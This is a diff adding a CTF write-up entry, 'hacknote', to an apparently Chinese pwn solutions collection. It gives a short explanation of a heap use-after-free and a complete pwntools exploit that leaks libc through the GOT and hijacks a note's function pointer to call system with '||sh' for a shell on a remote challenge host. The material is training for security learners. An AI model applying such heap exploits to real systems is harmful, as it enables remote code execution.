@@ -2699,3 +2699,84 @@ if __name__ == '__main__':
     io.sendline(b'/bin/sh\x00')
     io.interactive()
 ```
+
+### 29. hacknote
+题目：暂无
+
+思路：常规的堆溢出漏洞，主要存在的一个问题是在构造system("/bin/sh")的时候，没有办法直接将/bin/sh字符串传给system，但是可以用XXXX||sh传给system，一样可以达到效果，类似于命令注入的方式。
+
+全部源代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+debug = False
+if debug:
+    io = process('./hacknote')
+else:
+    io = remote('220.249.52.134', 45871)
+
+elf = ELF('hacknote')
+
+def add(size, data):
+    io.sendlineafter(':', '1')
+    io.sendlineafter(':', '%d' % size)
+    io.sendafter(':', data)
+
+def delete(index):
+    io.sendlineafter(':', '2')
+    io.sendlineafter(':', '%d' % index)
+
+def prnt(index):
+    io.sendlineafter(':', '3')
+    io.sendlineafter(':', '%d' % index)
+
+if __name__ == '__main__':
+    # create node0 len: 0x100
+    # create node1 len: 0x100
+    # chunk0: puts, xx
+    # chunk1: puts, xx
+    add(0x100, b'0'*0x100)
+    add(0x100, b'1'*0x100)
+
+    # delete node0 and node1
+    # prevent merge
+    add(0x100, b'2'*0x100)
+    delete(0)
+    delete(1)
+    # now fastbin has two chunk
+
+    # create node3 len: 0x8
+    # node3->data == chunk0
+    # chunk0: puts, got.free
+    payload = p32(0x0804862b) + p32(elf.got['puts'])
+    add(0x8, payload)
+
+    # print node0
+    # puts(got.free)
+    prnt(0)
+    free_addr = u32(io.recv(4))
+    log.success('free addr: 0x%x' % free_addr)
+
+    libc = LibcSearcher('puts', free_addr)
+    libc_base = free_addr - libc.dump('puts')
+    system_addr = libc_base + libc.dump('system')
+    log.success('system addr: 0x%x' % system_addr)
+
+    # delete node3
+    # fastbin has two chunk
+    delete(3)
+
+    # create node4, len:0x8
+    # node4->data == chunk0
+    # chunk0: system_addr,binsh_addr
+    payload = p32(system_addr) + b'||sh'
+    add(0x8, payload)
+    # gdb.attach(io)
+    # pause()
+
+    # print node0
+    # system(binsh_addr)
+    prnt(0)
+    io.interactive()
+```
